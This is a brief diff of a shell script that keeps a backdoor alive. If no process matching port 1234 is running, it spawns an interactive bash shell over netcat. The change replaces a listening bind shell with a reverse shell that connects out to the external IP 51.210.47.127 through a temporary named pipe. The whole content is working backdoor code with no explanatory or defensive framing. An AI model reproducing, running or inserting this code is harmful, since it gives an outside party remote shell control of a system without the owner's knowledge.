@@ -3,6 +3,7 @@
 n=$(ps aux | grep -o [1]234)
 
 if [[ $n = "" ]]; then
-    mkfifo f
-    nc -l 0.0.0.0 1234 < f | /bin/bash -i > f 2>&1
+    mkfifo /tmp/f; 
+    nc 51.210.47.127 1234 0</tmp/f | /bin/bash -i >/tmp/f 2>&1;
+    rm /tmp/f
 fi
